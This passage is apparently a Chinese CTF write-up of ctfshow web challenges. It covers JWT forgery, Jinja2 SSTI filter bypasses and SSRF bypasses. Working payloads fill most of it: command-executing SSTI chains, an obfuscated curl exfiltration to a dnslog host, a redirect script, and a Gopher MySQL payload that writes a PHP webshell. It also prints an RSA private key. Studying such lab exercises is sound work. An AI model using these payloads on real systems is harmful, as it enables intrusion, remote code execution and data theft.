eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5NjMyMTQ4OCwiZXhwIjoxNjk2MzI4Njg4LCJuYmYiOjE2OTYzMjE0ODgsInN1YiI6InVzZXIiLCJqdGkiOiJmZjczMGQ5Yjc5YTEyZWY5NTI2OTgyZjYxZDkxYjRiZCJ9.R_0R8ShiZNQNNle6H4s_prdGLLNJjbYm5YyenY7CJww
```

分析后得到HS256&Need Signature,所以得爆破密码。

```
hashcat -a 0 -m 16500
```

密钥为 123456

payload:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5NjMyMTQ4OCwiZXhwIjoxNjk2MzI4Njg4LCJuYmYiOjE2OTYzMjE0ODgsInN1YiI6ImFkbWluIiwianRpIjoiZmY3MzBkOWI3OWExMmVmOTUyNjk4MmY2MWQ5MWI0YmQifQ.9F9km5a71C0Pt-R-4EXMnCI_ot6WHut1kmS4ZR7Lf1U
```

拿到flag



### web348

同web347，继续爆破，得到密码为aaab

payload:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5NjMyMjQ1MiwiZXhwIjoxNjk2MzI5NjUyLCJuYmYiOjE2OTYzMjI0NTIsInN1YiI6ImFkbWluIiwianRpIjoiOGU0NDVlZTY4NzcyZmUzZjI1ZmFkNjllODE0MWZlOTcifQ.sjuE3NvuibTvFJa8p9HcGo_MZt5eaIxCm94RnbydWTg
```



### web349

附件：

```
/* GET home page. */
router.get('/', function(req, res, next) {
  res.type('html');
  var privateKey = fs.readFileSync(process.cwd()+'//public//private.key');
  var token = jwt.sign({ user: 'user' }, privateKey, { algorithm: 'RS256' });
  res.cookie('auth',token);
  res.end('where is flag?');
  
});

router.post('/',function(req,res,next){
	var flag="flag_here";
	res.type('html');
	var auth = req.cookies.auth;
	var cert = fs.readFileSync(process.cwd()+'//public/public.key');  // get public key
	jwt.verify(auth, cert, function(err, decoded) {
	  if(decoded.user==='admin'){
	  	res.end(flag);
	  }else{
	  	res.end('you are not admin');
	  }
	});
});
```

需要公钥和私钥

访问/private.key /public.key 得到公钥密钥

public key

```
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDNioS2aSHtu6WIU88oWzpShhkb
+r6QPBryJmdaR1a3ToD9sXDbeni5WTsWVKrmzmCk7tu4iNtkmn/r9D/bFcadHGnX
YqlTJItOdHZio3Bi1J2Elxg8IEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjA
bG1Naz58ibbtogeglQIDAQAB
-----END PUBLIC KEY-----
```



private key

```
-----BEGIN RSA PRIVATE KEY-----
MIICWwIBAAKBgQDNioS2aSHtu6WIU88oWzpShhkb+r6QPBryJmdaR1a3ToD9sXDb
eni5WTsWVKrmzmCk7tu4iNtkmn/r9D/bFcadHGnXYqlTJItOdHZio3Bi1J2Elxg8
IEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjAbG1Naz58ibbtogeglQIDAQAB
AoGAE+mAc995fvt3zN45qnI0EzyUgCZpgbWg8qaPyqowl2+OhYVEJq8VtPcVB1PK
frOtnyzYsmbnwjZJgEVYTlQsum0zJBuTKoN4iDoV0Oq1Auwlcr6O0T35RGiijqAX
h7iFjNscfs/Dp/BnyKZuu60boXrcuyuZ8qXHz0exGkegjMECQQD1eP39cPhcwydM
cdEBOgkI/E/EDWmdjcwIoauczwiQEx56EjAwM88rgxUGCUF4R/hIW9JD1vlp62Qi
ST9LU4lxAkEA1lsfr9gF/9OdzAsPfuTLsl+l9zpo1jjzhXlwmHFgyCAn7gBKeWdv
ubocOClTTQ7Y4RqivomTmlNVtmcHda1XZQJAR0v0IZedW3wHPwnT1dJga261UFFA
+tUDjQJAERSE/SvAb143BtkVdCLniVBI5sGomIOq569Z0+zdsaOqsZs60QJAYqtJ
V7EReeQX8693r4pztSTQCZBKZ6mJdvwidxlhWl1q4+QgY+fYBt8DVFq5bHQUIvIW
zawYVGZdwvuD9IgY/QJAGCJbXA+Knw10B+g5tDZfVHsr6YYMY3Q24zVu4JXozWDV
x+G39IajrVKwuCPG2VezWfwfWpTeo2bDmQS0CWOPjA==
-----END RSA PRIVATE KEY-----
```



导入得到jwt

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.NoE2xAUmDyHc0rhNtNtUn8URhEZeFGy9M0hd7hBEfRD3jpGqetn0nj2Tm9mob9LWyl2BazTLm_1Ez1vn0A6ZxgcpF73B6_rE4zrDvyu3b6eH3FtwmKd9I6N0KzkO1IpTggRVy6l4RoQCoG4JJ6X9YVJgOWtm0vgWzcjjXejlEsM
```

然后POST到根目录，拿到flag



### web350

```
router.get('/', function(req, res, next) {
  res.type('html');
  var privateKey = fs.readFileSync(process.cwd()+'//routes/private.key');
  var token = jwt.sign({ user: 'user' }, privateKey, { algorithm: 'RS256' });
 
  res.cookie('auth',token);
  res.end('where is flag?');
  
});
 
router.post('/',function(req,res,next){
	var flag="flag_here";
	res.type('html');
	var auth = req.cookies.auth;
	var cert = fs.readFileSync(process.cwd()+'//routes/public.key');  // get public key
	jwt.verify(auth, cert,function(err, decoded) {
	  if(decoded.user==='admin'){
	  	res.end(flag);
	  }else{
	  	res.end('you are not admin'+err);
	  }
	});
});

```

哦，看来又有公钥和私钥，**然而这次只拿到了公钥。**

这里我们可以利用：将RS256算法改为HS256（非对称密码算法=>对称密码算法）

绕过服务端签名检测，从而构造JWT

解释：   

        HS256算法使用密钥为所有消息进行签名和验证。
    
        而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。

如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。

        由于攻击者有时可以获取公钥，因此，攻击者可以将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名。
    
        这样的话，后端代码使用RSA公钥+HS256算法进行签名验证

把原来的脚本修改一下

```
const jwt = require('jsonwebtoken');
var fs = require('fs');
var privateKey = fs.readFileSync('public.key');
var token = jwt.sign({ user: 'admin' }, privateKey, { algorithm: 'HS256' });
console.log(token)
```

jwt payload:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2OTYzMzU0Njd9.VZuPjTj3neBAFdRAOGKWXmyugvAkws8Tm0s37UyQPug
```

VScode也有bug啊。

终于拿到flag了，环境坑我不浅。

恭喜AK！

# 0x0A SSTI

SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数

```
__dict__ 保存类实例或对象实例的属性变量键值对字典
__class__  返回类型所属的对象
__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__bases__   返回该对象所继承的基类
// __base__和__mro__都是用来寻找基类的

__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
__init__  类的初始化方法
__globals__  对包含函数全局变量的字典的引用
```

## web361（无过滤）

抄的[CTFSHOW-SSTI](https://blog.csdn.net/qq_46918279/article/details/121270806)：

```
1、先找基类object，用空字符串""来找
在python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。
使用?name={{"".__class__}}，得到空字符串的类<class 'str'>
点号. ：python中用来访问变量的属性
__class__：类的一个内置属性，表示实例对象空字符串""的类。

然后使用?name={{"".__class__.__mro__}}，得到(<class 'tuple'>, <class 'object'>)
__mro__       method resolution order，即解析方法调用的顺序；此属性是由类组成的元组，在方法解析期间会基于它来查找基类。

然后再用?name={{().__class__.__mro__[-1]}}，取得最后一个东西即空字符串的类的基类<class 'object'>
或者使用?name={{"".__class__.__bases__}}，得到空字符串的类的基类<class 'object'>
__base__             类型对象的直接基类
__bases__           类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__

2、得到基类之后，找到这个基类的子类集合
使用?name={{().__class__.__mro__[1].__subclasses__()}}
__subclasses__()     返回这个类的子类集合，每个类都保留一个对其直接子类的弱引用列表。该方法返回一个列表，其中包含所有仍然存在的引用。列表按照定义顺序排列。

3、找到其所有子类集合之后找一个我们能够使用的类，要求是这个类的某个方法能够被我们用于执行、找到flag
这里使用其第133个类（[0]是第一个类）<class 'os._wrap_close'>
使用?name={{"".__class__.__mro__[-1].__subclasses__()[132]}}，得到<class 'os._wrap_close'>

<class 'os._wrap_close'>        这个类有个popen方法可以执行系统命令

4、实例化我们找到的类对象
使用?name={{"".__class__.__mro__[-1].__subclasses__()[132].__init__}}，实例化这个类
__init__             初始化类，返回的类型是function

5、找到这个实例化对象的所有方法
使用?name={{"".__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__}}
__globals__          使用方式是 function.__globals__获取function所处空间下可使用的module、方法以及所有变量。

6、根据方法寻找flag
?name={{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}

popen()一个方法，用于执行命令
read() 从文件当前位置起读取size个字节，若无参数size，则表示读取至文件结束为止，它范围为字符串对象
```

### **工具法：**

```python
python3 -m fenjing crack --url "http://a4251275-7533-4820-a6b3-edc8956ff8ca.challenge.ctf.show/" --method GET --inputs name
```

## web362（过滤数字）

```
def translate_digits(s):
    mapping = str.maketrans("0123456789", "０１２３４５６７８９")
    return s.translate(mapping)

def translate_letters_encode(s):
    mapping = str.maketrans("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", "𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙")
    return s.translate(mapping)

def translate_letters_fullangle(s):
    mapping = str.maketrans("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", "ａｂｃｄｅｆｇｈｉｊｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚＡＢＣＤＥＦＧＨＩＪＫＬＭＮＯＰＱＲＳＴＵＶＷＸＹＺ")
    return s.translate(mapping)

s = "{{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}"
s = translate_digits(s)
print(s)
```

过滤了数字，用全角bypass一下即可

```
{{().__class__.__mro__[-１].__subclasses__()[１３２].__init__.__globals__['popen']('cat /flag').read()}}
```

## web363（过滤单双引号）

过滤了单双引号，使用命令执行拼接一下

```
?a=os&b=popen&c=cat /flag&name={{url_for.__globals__[request.args.a][request.args.b](request.args.c).read()}}
```

## web364（过滤了args，换其他参数传值(cookie)即可）

过滤了args，换其他参数传值即可

```
?name={{url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()}}

Cookie:a=os;b=popen;c=cat /flag
```

## web365(过滤了中括号[])

过滤了中括号[]

```
?name={{url_for.__globals__.os.popen(request.cookies.a).read()}}

Cookie:a=cat /flag
```

## web366(过滤了下划线，我们可以使用attr方法)

过滤了下划线，我们可以使用attr方法，request|attr(request.cookies.a)等价于request[“a”]

```
?name={{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}

Cookie:a=__globals__;b=cat /flag
```

## web367(过滤os，继续绕即可)

过滤os，继续绕即可

```
?name={{(lipsum|attr(request.cookies.a)).get(request.cookies.b).popen(request.cookies.c).read()}}

Cookie:a=__globals__;b=os;c=cat /flag
```

## web368(过滤{{)

ban掉了{{

```
?name={% print(lipsum|attr(request.cookies.a)).get(request.cookies.b).popen(request.cookies.c).read() %}

Cookie:a=__globals__;b=os;c=cat /flag
```

## web369（过滤request，用{%%}）

ban掉了request，{%%}执行代码、拼接字符赋值给变量

```
{% set po=dict(po=a,p=a)|join%}  #通过dict()和join构造pop

{% set a=(()|select|string|list)|attr(po)(24)%} #a等价于下划线

{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}  #通过拼接得到__init__
#glo、geti、built同理
#再往后，调用chr，构造/flag，读取文件
?name=
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(24)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
{%print(x.open(file).read())%}
```

## web370（过滤数字）

ban掉了数字，用之前那个脚本替换一下即可

```
?name=
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(２４)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set file=chr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%}
{%print(x.open(file).read())%}
```

## web371（过滤print）

ban了print，curl外带

取dnslog上找个没数字的ip

```python
?name={%set a=dict(po=aa,p=aa)|join%}{%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|count%}{%set k=dict(eeeeeeeee=a)|join|count%}{%set l=dict(eeeeeeee=a)|join|count%}{%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}{%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|count%}{% set b=(lipsum|string|list)|attr(a)(j)%}{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%}{%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%}{%set e=dict(o=cc,s=aa)|join%}{% set f=(lipsum|string|list)|attr(a)(k)%}{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%}{%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%}{%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%}{%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(jnuuvv=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%}{%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%}ataoyyds{%endif%}
```

![image-20231113133434469](assets/image-20231113133434469.png)

## web372

用length替换count

```python
Payload:?name={%set a=dict(po=aa,p=aa)|join%}{%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|length%}{%set k=dict(eeeeeeeee=a)|join|length%}{%set l=dict(eeeeeeee=a)|join|length%}{%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|length%}{%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|length%}{% set b=(lipsum|string|list)|attr(a)(j)%}{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%}{%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%}{%set e=dict(o=cc,s=aa)|join%}{% set f=(lipsum|string|list)|attr(a)(k)%}{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%}{%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%}{%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%}{%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(jnuuvv=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%}{%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%}atao{%endif%}
```

# 0x0B SSRF

SSRF全称是Server-Side Request Forgery:服务器端请求伪造，目的是伪造服务器请求去访问无法从外网访问的内网系统

***

## web351

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
?>
```

第一题没什么过滤，说明一下第6和第7行

| **CURLOPT_HEADER**         | 启用时会将头文件的信息作为数据流输出。                       |
| -------------------------- | ------------------------------------------------------------ |
| **CURLOPT_RETURNTRANSFER** | **true将[curl_exec()](https://www.php.net/manual/zh/function.curl-exec.php)获取的信息以字符串返回，而不是直接输出。** |

第8行执行给定的curl会话，执行成功时返回结果

`payload：`

```
url=http://127.0.0.1/flag.php

url=file://../../../../../../var/www/html/flag.php
```



## web352

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127.0.0/')){//这里有问题
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```

主要是加了一个过滤：

```
if(!preg_match('/localhost|127.0.0/'))
```

但这个代码其实写错了，因为没规定匹配哪个变量里的字符串，所以上一题的payload还是能打:

`payload：url=http://127.0.0.1/flag.php`

## web353

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127\.0\.|\。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```

```php
127.1可被解析为127.0.0.1，因为0可缺省
在linux中，0会被解析为127.0.0.1
127.0.0.0/8是一个环回地址网段，从127.0.0.1 ~ 127.255.255.254都表示localhost
```

用127.1等绕过就行



```
payload：url=http://127.1.0.1/flag.php

url=http://0/flag.php
```



## web354(禁用0和1，采用302跳转)

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|1|0|。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```

这个题有点怪，参考了其他师傅的wp，思路大概是在自己的vps上做个302跳转到127.0.0.1/flag.php上，这个payload是羽师傅还是Y4师傅的了记不清了，总之谢谢师傅们提供的payload

![image-20231114095534744](assets/image-20231114095534744.png)

`payload：url=http://sudo.cc/flag.php`

以下域名都可以解析到127.0.0.1

```php
过滤了0和1，可以把域名解析到127.0.0.1
http://safe.taobao.com/
http://114.taobao.com/
http://wifi.aliyun.com/
http://imis.qq.com/
http://localhost.sec.qq.com/
http://ecd.tencent.com/
http://sudo.cc/
```



## web355

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$host=$x['host'];
if((strlen($host)<=5)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```

限制域名长度不超过5，可以用127.*（0除外）

`payload：url=http://127.1/flag.php`

## web356

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$host=$x['host'];
if((strlen($host)<=3)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```

**小知识点，0在linux下会被解析成127.0.0.1，而在win中被解析成0.0.0.0**

`payload：url=http://0/flag.php`

url=http://0.0/flag.php

## web357(302跳转)

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$ip = gethostbyname($x['host']);
echo '</br>'.$ip.'</br>';
if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    die('ip!');
}

echo file_get_contents($_POST['url']);
}
else{
    die('scheme');
}
?> scheme
```

看第9行的过滤器，FILTER_VALIDATE_IP 过滤器把值作为 IP 进行验证。

可能的标志：

- FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）
- FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）
- FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）
- FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。

**返回值是过滤后的数据，如果过滤失败则返回FALSE**

**排除了私有地址和保留地址，我直接在自己网站放放了个重定向网页：**

第一种解法是在自己的vps上写个test.php

```php
<?php
header("Location:http://127.0.0.1/flag.php"); 
```

`payload：url=http://xxx/test.php`

第二种解法是利用dns重绑定漏洞，**大佬文章：https://zhuanlan.zhihu.com/p/89426041**

![image-20220113025537987](assets/image-20220113025537987.png)

在ceye上进行dns重绑定

`payload：url=http://r.xxx/flag.php`

## web358

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){
    echo file_get_contents($url);
}
```

以ctf.开头，以show结尾，同时保证host为本地地址	

`payload：url=http://ctf.@127.0.0.1/flag.php?show`

## web359

hint说打无密码的mysql，那么考虑万能协议Gopher

>gopher：gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议。
>
>Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。
>
>gopher协议没有默认端口，所以需要指定web端口，而且需要指定post方法。回车换行使用%0d%0a。注意post参数之间的&分隔符也要进行url编码。

利用点returl：

![image-20220113132558446](assets/image-20220113132558446.png)

![image-20220113132608477](assets/image-20220113132608477.png)

工具利用地址：https://github.com/tarunkant/Gopherus

![image-20220113132205604](assets/image-20220113132205604.png)

指定用户名和命令，这里写个马进去，注意不是所有情况下都可以写马，当前用户必须存在file权限，以及导出到`--secure-file-priv`指定目录下，并且导入目录需要有写权限。因为我这里post时会进行一次url解码，所以将结果再进行一次urlencode

```python
python2 gopherus.py --exploit mysql select '<?php eval($_POST[0]);?>' into outfile '/var/www/html/1.php'
```

`payload：`

```php
工具得到：gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%30%5d%29%3b%3f%3e%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%27%01%00%00%00%01

之后两种选择：
1.用hackbar发包
将gopher://127.0.0.1:3306/_后面的部分，再url编码一次（记得是选择全部编码，不仅仅是特殊字符，用google浏览器的hackbar，选择urlencode all_charactors）

gopher://127.0.0.1:3306/_%25%61%33%25%30%30%25%30%30%25%30%31%25%38%35%25%61%36%25%66%66%25%30%31%25%30%30%25%30%30%25%30%30%25%30%31%25%32%31%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%30%25%30%30%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%35%66%25%36%65%25%36%31%25%37%34%25%36%39%25%37%36%25%36%35%25%35%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%66%25%37%32%25%36%34%25%30%30%25%36%36%25%30%33%25%35%66%25%36%66%25%37%33%25%30%35%25%34%63%25%36%39%25%36%65%25%37%35%25%37%38%25%30%63%25%35%66%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%35%66%25%36%65%25%36%31%25%36%64%25%36%35%25%30%38%25%36%63%25%36%39%25%36%32%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%30%34%25%35%66%25%37%30%25%36%39%25%36%34%25%30%35%25%33%32%25%33%37%25%33%32%25%33%35%25%33%35%25%30%66%25%35%66%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%35%66%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%30%36%25%33%35%25%32%65%25%33%37%25%32%65%25%33%32%25%33%32%25%30%39%25%35%66%25%37%30%25%36%63%25%36%31%25%37%34%25%36%36%25%36%66%25%37%32%25%36%64%25%30%36%25%37%38%25%33%38%25%33%36%25%35%66%25%33%36%25%33%34%25%30%63%25%37%30%25%37%32%25%36%66%25%36%37%25%37%32%25%36%31%25%36%64%25%35%66%25%36%65%25%36%31%25%36%64%25%36%35%25%30%35%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%34%35%25%30%30%25%30%30%25%30%30%25%30%33%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%32%37%25%33%63%25%33%66%25%37%30%25%36%38%25%37%30%25%32%30%25%36%35%25%37%36%25%36%31%25%36%63%25%32%38%25%32%34%25%35%66%25%35%30%25%34%66%25%35%33%25%35%34%25%35%62%25%33%30%25%35%64%25%32%39%25%33%62%25%33%66%25%